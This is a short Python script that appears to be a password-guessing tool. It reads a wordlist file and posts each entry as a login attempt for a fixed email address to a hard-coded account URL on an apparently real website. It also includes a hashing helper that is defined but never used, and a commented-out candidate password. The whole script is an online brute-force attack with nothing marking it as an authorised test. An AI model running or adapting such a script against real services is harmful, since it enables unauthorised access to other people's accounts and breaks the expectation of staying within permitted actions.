import requests
import hashlib
def define_hashes(cleaned_password):
    wynik =[] 
    wynik.append(hashlib.sha256(cleaned_password.encode('utf-8')).hexdigest())   
    wynik.append(hashlib.md5(cleaned_password.encode('utf-8')).hexdigest())   
    wynik.append(hashlib.sha512(cleaned_password.encode('utf-8')).hexdigest())    
    wynik.append(hashlib.sha1(cleaned_password.encode('utf-8')).hexdigest())  
    wynik.append(hashlib.sha224(cleaned_password.encode('utf-8')).hexdigest())  
    wynik.append(hashlib.sha384(cleaned_password.encode('utf-8')).hexdigest()) 
    print(cleaned_password)
    for hash in wynik: print(hash)
    return wynik

def sendRequest(login, hash, url_passed):
    url = url_passed
    payload = {
        "identity": login,
        "password": hash
    }

    return requests.post(url, json=payload, timeout=30)

def main():
    # url = input("Podal url ").strip()
    # login = input("Podaj login ").strip()
    url = "https://www.pikorepetycje.pl/account"
    login = "test@gmail.com"
    # Password1234! 

    file_with_passwords = open('/Users/kacperwrobel/Documents/cyber_tools/password_files/10_passwords.txt', 'r', encoding='latin-1')
    for password in file_with_passwords.readlines():
        cleaned_password = password.strip() 
        request = sendRequest(login, cleaned_password, url)
        print(request)
        

if __name__ == "__main__":
    main()